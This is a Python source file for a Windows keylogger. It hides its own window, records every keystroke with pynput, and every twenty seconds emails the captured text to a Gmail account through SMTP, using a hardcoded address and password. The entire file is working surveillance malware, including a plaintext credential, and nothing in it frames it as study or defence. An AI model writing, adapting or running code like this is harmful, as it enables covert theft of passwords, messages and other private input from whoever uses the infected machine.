import win32gui, win32con
#this hides the program
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)
from pynput.keyboard import Listener
import smtplib
from threading import Timer
from datetime import datetime

interval_Between_Sends = 20
email_address = "sendKeyloggerLogs@gmail.com"
password = "!Havenotyetbeguntofight$"
allTheKeystrokes=""


def keylogger(keystroke):
    global allTheKeystrokes
    keystroke = str(keystroke)

    if keystroke =='Key.space':
        keystroke = ' '
    elif keystroke =='Key.shift_r':
        keystroke = ''
    elif keystroke == 'Key.enter':
        keystroke = '\n'
    #print(keystroke)
    allTheKeystrokes+=keystroke


def emailLogs():
    global allTheKeystrokes
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()
    server.login(email_address,password)
    server.sendmail(email_address, email_address, allTheKeystrokes)
    server.quit()   
    allTheKeystrokes=""
    Timer(interval_Between_Sends,emailLogs).start()


Timer(interval_Between_Sends,emailLogs).start()
with Listener(on_press=keylogger) as l:
    l.join()


    
